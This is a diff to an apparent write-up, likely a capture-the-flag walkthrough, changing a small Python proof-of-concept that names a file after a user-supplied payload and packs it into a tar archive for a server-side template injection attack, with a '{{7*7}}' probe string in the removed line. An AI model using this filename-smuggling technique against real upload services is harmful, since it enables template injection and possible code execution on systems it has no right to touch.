@@ -120,7 +120,7 @@
 
 ### Proof of concept writing 
 
-- I wrote a python script that stores the payload with  `input()` and creates a file with the payload's name.Then, a tarfile named `zip.tar` is created with module `tarfile` and the payload named file is added to it.
+- I wrote a python script that stores the payload with  `input()` and creates a file with the payload's name.Then, a tarfile named `zip.tar` is created with module `tarfile` and the payload named file is added to it. This code works in a loop.
 
 - Code:
       
@@ -131,7 +131,7 @@
           file = open(string,"w")
           file.close()
           #tarfile+ssti exploit
-          tarfilez = tarfile.open("{{7*7}}.tar","w")
+          tarfilez = tarfile.open("zip.tar","w")
           tarfilez.add(string)
           tarfilez.close()
           print("[+]zip.tar created")
